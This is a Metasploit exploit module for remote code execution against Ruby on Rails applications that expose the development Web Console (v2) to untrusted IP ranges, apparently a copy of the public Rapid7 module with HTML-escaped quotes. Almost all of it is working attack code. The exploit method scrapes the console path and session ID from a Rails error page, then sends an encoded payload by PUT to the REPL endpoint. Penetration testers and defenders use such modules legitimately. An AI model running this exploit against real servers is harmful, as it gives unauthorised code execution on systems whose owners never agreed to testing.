# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Ruby on Rails Development Web Console (v2) Code Execution&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a remote code execution feature of the Ruby on Rails
        framework. This feature is exposed if the config.web_console.whitelisted_ips
        setting includes untrusted IP ranges and the web-console gem is enabled.
      },
      &#039;Author&#039;         => [&#039;hdm&#039;],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;URL&#039;, &#039;https://github.com/rails/web-console&#039; ]
        ],
      &#039;Platform&#039;       => &#039;ruby&#039;,
      &#039;Arch&#039;           => ARCH_RUBY,
      &#039;Privileged&#039;     => false,
      &#039;Targets&#039;        => [ [&#039;Automatic&#039;, {} ] ],
      &#039;DefaultOptions&#039; => { &#039;PrependFork&#039; => true },
      &#039;DisclosureDate&#039; => &#039;May 2 2016&#039;,
      &#039;DefaultTarget&#039; => 0))
 
    register_options(
      [
        Opt::RPORT(3000),
        OptString.new(&#039;TARGETURI&#039;, [ true, &#039;The path to a vulnerable Ruby on Rails application&#039;, &#039;/missing404&#039; ])
      ], self.class)
  end
 
  #
  # Identify the web console path and session ID, then inject code with it
  #
  def exploit
    res = send_request_cgi({
      &#039;uri&#039;     => normalize_uri(target_uri.path),
      &#039;method&#039;  => &#039;GET&#039;
    }, 25)
 
    unless res
      print_error("Error: No response requesting #{datastore[&#039;TARGETURI&#039;]}")
      return
    end
 
    unless res.body.to_s =~ /data-mount-point=&#039;([^&#039;]+)&#039;/
      if res.body.to_s.index(&#039;Application Trace&#039;) && res.body.to_s.index(&#039;Toggle session dump&#039;)
        print_error(&#039;Error: The web console is either disabled or you are not in the whitelisted scope&#039;)
      else
        print_error("Error: No rails stack trace found requesting #{datastore[&#039;TARGETURI&#039;]}")
      end
      return
    end
 
    console_path = normalize_uri($1, &#039;repl_sessions&#039;)
 
    unless res.body.to_s =~ /data-session-id=&#039;([^&#039;]+)&#039;/
      print_error("Error: No session id found requesting #{datastore[&#039;TARGETURI&#039;]}")
      return
    end
 
    session_id = $1
 
    print_status("Sending payload to #{console_path}/#{session_id}")
    res = send_request_cgi({
      &#039;uri&#039;       => normalize_uri(console_path, session_id),
      &#039;method&#039;    => &#039;PUT&#039;,
      &#039;headers&#039;   => {
        &#039;Accept&#039;           => &#039;application/vnd.web-console.v2&#039;,
        &#039;X-Requested-With&#039; => &#039;XMLHttpRequest&#039;
      },
      &#039;vars_post&#039; => {
        &#039;input&#039; => payload.encoded
      }
    }, 25)
  end
end

